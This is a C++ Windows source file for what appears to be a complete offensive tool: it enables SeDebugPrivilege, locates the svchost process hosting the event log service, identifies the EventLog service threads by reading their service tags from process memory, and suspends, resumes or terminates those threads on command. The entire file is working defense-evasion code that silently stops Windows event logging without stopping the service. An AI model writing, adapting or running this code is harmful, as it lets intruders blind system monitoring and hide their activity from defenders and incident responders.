#include <Check.h>


DWORD fn_seek_logservice_pid() {

	HANDLE hProcessList = NULL;
	DWORD dwProcessId = 0;
	LPTSTR lpExeFullPath = new WCHAR[MAX_PATH];
	DWORD dwFlags = 0;
	DWORD lpSize = 100;
	PROCESSENTRY32 pe32;


	ZeroMemory(&pe32, sizeof(PROCESSENTRY32));
	pe32.dwSize = sizeof(PROCESSENTRY32);

	__try {

		hProcessList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessList == INVALID_HANDLE_VALUE) {
			cout << "[+] create task snapshot falure" << endl;
			return FALSE;
		}

		Process32First(hProcessList, &pe32);
		do {

			INT nCompare = lstrcmpW(pe32.szExeFile, L"svchost.exe");
			if (nCompare == 0) {
				dwProcessId = fn_enum_process_module(pe32.th32ProcessID);
				if (dwProcessId >= 1) {
					break;
				}
			}
		} while (Process32Next(hProcessList, &pe32));
		return dwProcessId;

	}
	__finally {
		CloseHandle(hProcessList);
	}

}
DWORD fn_enum_process_module(DWORD dwProcessId) {

	HANDLE hModuleSnapshotHandle = NULL;
	DWORD dwEventProcessId = NULL;
	MODULEENTRY32 dll32;
	ZeroMemory(&dll32, sizeof(MODULEENTRY32));
	dll32.dwSize = sizeof(MODULEENTRY32);


	__try {
		hModuleSnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId);
		if (hModuleSnapshotHandle == INVALID_HANDLE_VALUE) {
			fn_GetLastError("enum_process_module CreateToolhelp32Snapshot Failed!");
			return FALSE;
		}
		Module32First(hModuleSnapshotHandle, &dll32);
		do {

			if (!lstrcmpW(dll32.szModule, L"wevtsvc.dll")) {
				cout << "[+] get event log service process id : " << dll32.th32ProcessID << endl;
				dwEventProcessId = dll32.th32ProcessID;
				break;
			}
		} while (Module32Next(hModuleSnapshotHandle, &dll32));
		return dwEventProcessId;

	}
	__finally {
		CloseHandle(hModuleSnapshotHandle);
	}

}


BOOL fn_get_service_name(DWORD dwProcessId, ULONG subProcessTag)
{

	SC_SERVICE_TAG_QUERY tagQuery = { 0, };
	tagQuery.ServiceTag = subProcessTag;
	tagQuery.ProcessId = dwProcessId;

	FN_I_QueryTagInformation _I_QueryTagInformation =(FN_I_QueryTagInformation)GetProcAddress(GetModuleHandle(L"advapi32.dll"), "I_QueryTagInformation");

	_I_QueryTagInformation(NULL, ServiceNameFromTagInformation, &tagQuery);
	if (!lstrcmpi((LPWSTR)tagQuery.Buffer, L"EventLog"))
	{
		return true;
	}
	return false;

}

VOID fn_GetLastError(LPCSTR lpszFunction)
{
	LPVOID lpMsgBuf;
	char Mes[1024] = { 0, };
	DWORD dw = GetLastError();

	FormatMessageA(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPSTR)& lpMsgBuf,
		0, NULL);

	sprintf_s(Mes, "%s failed with error 0x%x: %s", lpszFunction, dw, lpMsgBuf);
	MessageBoxA(NULL, Mes, "failed", MB_OK);
	//ExitProcess(dw);
}

BOOL fn_query_thread_information(DWORD dwProcessId, HANDLE hOpenThread)
{
	THREAD_BASIC_INFORMATION threadBasicInfo;
	HANDLE hProcess;
	DWORD dwOffset;
	ULONG lpTagBuffer = NULL;
	BOOL Status = false;


	FN_NtQueryInformationThread NtQueryInformationThread = 
		(FN_NtQueryInformationThread)GetProcAddress(LoadLibrary(L"Ntdll.dll"), "NtQueryInformationThread");
	NtQueryInformationThread(hOpenThread, (THREAD_INFORMATION_CLASS)0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);
	hProcess = OpenProcess(PROCESS_VM_READ, false, dwProcessId);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		fn_GetLastError("fn_query_thread_information OPenProc Failed! ");
	}
	IsWow64Process(hProcess, &Status);
	if (!Status)
		dwOffset = 0x1720;
	else
		dwOffset = 0xf60;

	if (!ReadProcessMemory(hProcess, ((PBYTE)threadBasicInfo.TebBaseAddress + dwOffset), &lpTagBuffer, sizeof(lpTagBuffer), NULL))
	{
		fn_GetLastError("ReadProcessMemory Failed!");
		return false;
	}
	return fn_get_service_name(dwProcessId, lpTagBuffer);;
}


DWORD fn_threadInfo_rettid(DWORD dwProcessId, vector<INT>& threads)
{
	HANDLE hThreadSnapHandle = NULL;
	HANDLE hOpenThread = NULL;
	BOOL bRet = FALSE;
	THREADENTRY32 te32;
	ZeroMemory(&te32, sizeof(THREADENTRY32));
	te32.dwSize = sizeof(THREADENTRY32);

	__try {

		hThreadSnapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessId);
		if (hThreadSnapHandle == INVALID_HANDLE_VALUE) {
			return FALSE;
		}

		Thread32First(hThreadSnapHandle, &te32);
		do {
			if (te32.th32OwnerProcessID == dwProcessId) {

				hOpenThread = OpenThread(PROCESS_ALL_ACCESS, FALSE, te32.th32ThreadID);
				bRet = fn_query_thread_information(dwProcessId, hOpenThread);
				if (bRet)
				{
					threads.push_back(te32.th32ThreadID);
				}
			}

		} while (Thread32Next(hThreadSnapHandle, &te32));

	}
	__finally {
		CloseHandle(hThreadSnapHandle);
		CloseHandle(hOpenThread);
	}
}

BOOL fn_GrantPriviledge(WCHAR* PriviledgeName)
{
	//PriviledgeName  SE_DEBUG_NAME
	TOKEN_PRIVILEGES TokenPrivileges, OldPrivileges;
	DWORD             dwReturnLength = sizeof(OldPrivileges);
	HANDLE             TokenHandle = NULL;
	LUID             uID;

	// 打开权限令牌
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &TokenHandle))
	{
		if (GetLastError() != ERROR_NO_TOKEN)
		{
			return FALSE;
		}
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle))
		{
			return FALSE;
		}
	}

	if (!LookupPrivilegeValue(NULL, PriviledgeName, &uID))        // 通过权限名称查找uID
	{
		fn_GetLastError("LookupPrivilegeValue");
		CloseHandle(TokenHandle);
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;        // 要提升的权限个数
	TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    // 动态数组，数组大小根据Count的数目
	TokenPrivileges.Privileges[0].Luid = uID;

	// 在这里我们进行调整权限
	if (!AdjustTokenPrivileges(TokenHandle, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), &OldPrivileges, &dwReturnLength))
	{
		CloseHandle(TokenHandle);
		return FALSE;
	}

	// 成功了
	cout <<"[+] AdjustTokenPrivileges Successful!"<< endl;
	CloseHandle(TokenHandle);
	return TRUE;
}


void fn_Suspend_threads(vector<INT>& threads)
{
	DWORD Nsize = threads.size();
	HANDLE hThread = NULL;
	for (int i = 0; i < Nsize; i++)
	{
		hThread = OpenThread(THREAD_SUSPEND_RESUME, false, threads.at(i));
		if (hThread==INVALID_HANDLE_VALUE)
		{
			fn_GetLastError("Open thread failed!");
			return;
		}
		SuspendThread(hThread);
		cout << "[+] SuspendThread " << threads.at(i) << endl;
		CloseHandle(hThread);
	}
}

void fn_Resume_Threads(vector<INT>& threads)
{
	DWORD Nsize = threads.size();
	HANDLE hThread = NULL;
	for (int i = 0; i < Nsize; i++)
	{
		hThread = OpenThread(THREAD_SUSPEND_RESUME, false, threads.at(i));
		if (hThread == INVALID_HANDLE_VALUE)
		{
			fn_GetLastError("Open thread failed!");
			return ;
		}
		ResumeThread(hThread);
		cout << "[+] ResumeThread " << threads.at(i) << endl;
		CloseHandle(hThread);
	}
}

void fn_TerminateThread_Threads(vector<INT>& threads)
{
	
	DWORD Nsize = threads.size();
	HANDLE hThread = NULL;
	for (int i = 0; i < Nsize; i++)
	{
		hThread = OpenThread(THREAD_TERMINATE, false, threads.at(i));
		if (hThread == INVALID_HANDLE_VALUE)
		{
			fn_GetLastError("Open thread failed!");
			return;
		}
		TerminateThread(hThread,0);
		cout << "[+] TerminateThread " << threads.at(i) << endl;
		CloseHandle(hThread);
	}
}



bool fn_parament()
{
	int nArgs = 0;
	LPWSTR* lpParam = CommandLineToArgvW(GetCommandLine(), &nArgs);
	if (nArgs <= 1)
	{
		cout << "[!] Arg Number Error ! please input argv :[SuspendThread]|[ResumeThread]|[TerminateThread]" << endl;
		return false;
	}
	if (!lstrcmpi(*(lpParam + 1), L"SuspendThread"))
	{
		FN = (FnCall)fn_Suspend_threads;
	}
	if (!lstrcmpi(*(lpParam + 1), L"ResumeThread"))
	{
		FN = (FnCall)fn_Resume_Threads;
	}
	if (!lstrcmpi(*(lpParam + 1), L"TerminateThread"))
	{
		FN = (FnCall)fn_TerminateThread_Threads;
	}

	if (FN == NULL)
	{
		cout << "[!] Arg Value  Error ! please input argv :[SuspendThread]|[SuspendThread]" << endl;
		return false;
	}
	return true;
}


int main()
{	
	vector<INT> threads;

	if (!fn_parament())
		return 0;
	if (!fn_GrantPriviledge(L"SeDebugPrivilege"))
		return 0;
	DWORD dwProcessID = fn_seek_logservice_pid();
	fn_threadInfo_rettid(dwProcessID, threads);
	(*FN)(threads);

	return 0;
}
